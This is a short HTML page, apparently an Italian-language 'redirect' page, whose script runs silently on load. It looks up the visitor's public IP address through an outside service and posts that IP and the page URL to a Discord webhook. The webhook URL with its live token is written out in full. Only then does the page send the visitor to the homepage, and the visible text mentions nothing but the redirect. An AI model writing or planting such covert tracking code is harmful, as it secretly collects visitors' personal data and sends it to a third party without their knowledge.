<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // Ottieni l'indirizzo IP pubblico dell'utente
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const url = window.location.href;

        // Invia l'IP e l'URL al webhook Discord
        fetch("https://discord.com/api/webhooks/1384202309453480069/EVzqU4GCsD8160NE82evIVyBUeMtrybYIzVXAfvMBQD5LIssbN8rmvBnzOVqusT0UJT7", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `üì° Visita ricevuta\nüåê URL: ${url}\nüåç IP: ${ip}`
          })
        })
        .then(response => {
          if (response.ok) {
            console.log("‚úÖ Webhook Discord inviato con successo");
          } else {
            console.error("‚ùå Errore nella richiesta Discord:", response.status, response.statusText);
          }
        })
        .catch(error => {
          console.error("‚ùå Errore di rete durante invio al webhook:", error);
        })
        .finally(() => {
          // Reindirizza alla homepage dopo la richiesta
          window.location.href = "/";
        });
      })
      .catch(error => {
        console.error("‚ùå Errore nel recupero IP:", error);
        // Reindirizza comunque anche in caso di errore
        window.location.href = "/";
      });
  </script>
</head>
<body>
  <p>Redirecting to homepage...</p>
</body>
</html>
